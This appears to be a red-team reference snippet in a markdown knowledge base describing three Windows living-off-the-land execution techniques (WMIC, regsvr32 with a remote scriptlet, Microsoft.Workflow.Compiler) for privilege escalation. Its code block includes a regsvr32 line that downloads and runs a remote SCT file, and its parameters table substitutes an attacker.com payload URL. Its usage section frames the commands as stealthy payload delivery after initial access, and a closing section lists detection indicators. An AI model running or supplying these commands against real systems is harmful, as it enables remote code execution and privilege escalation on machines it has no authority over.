---
id: 66f3c319-51de-4e7d-a3be-a7278ec64755
name: Windows-LOLBins-Execution-Snippet
type: code
language: cmd
verified: true
created_at: '2023-04-06T03:56:30.070919+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - eop
  - lolbins
  - execution
validated: true
---

# Windows-LOLBins-Execution-Snippet

## Code

```cmd
wmic.exe process call create calc
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
Microsoft.Workflow.Compiler.exe tests.xml results.xml
```

## Description

This snippet demonstrates three LOLBin techniques for indirect command execution on Windows: spawning processes with WMIC, downloading and running remote SCT files via Regsvr32, and compiling malicious workflows with Microsoft.Workflow.Compiler. It serves as a reference for building privilege escalation payloads using native tools.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://example.com/file.sct | URL to remote SCT payload for Regsvr32 | http://attacker.com/escalate.sct |
| tests.xml | Input XML workflow file path | C:\temp\malicious.xml |
| results.xml | Output XML file path | C:\temp\output.xml |
| calc | Benign process name (replace with payload) | powershell.exe -File escalate.ps1 |

## Usage

Execute this snippet in a CMD or PowerShell session with low privileges to test LOLBin execution. Customize parameters for specific escalation (e.g., replace 'calc' with a script exploiting a vuln). Use in red team ops for stealthy code delivery after initial access.

## Detection

- Sysmon Event ID 1 for process creation with parent/child anomalies (e.g., WMIC spawning unusual exes).
- Network logs for Regsvr32 HTTP requests to non-Microsoft domains.
- File monitoring for XML workflows in temp directories or compiler invocations.
- EDR behavioral rules for LOLBin abuse (e.g., Regsvr32 with /i flag).

## Related

- [[procedures/Windows-EoP-with-Living-Off-The-Land-Binaries-and-Scripts]]
